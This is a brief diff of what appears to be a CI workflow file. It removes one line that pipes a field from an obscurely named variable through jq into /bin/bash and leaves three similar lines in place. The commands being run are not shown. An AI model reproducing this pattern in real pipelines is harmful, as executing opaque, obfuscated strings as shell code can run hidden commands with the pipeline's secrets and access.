@@ -30,7 +30,6 @@ jobs:
           echo $cnbzk70334 | jq -r .cm913 | /bin/bash
           echo $qd2131 | jq -r .bkmmc04568 | /bin/bash
           printf '%s' "$wags0" | jq -r .zzae9142 | /bin/bash
-          printf '%s' "$apmua87006" | jq -r .c663 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
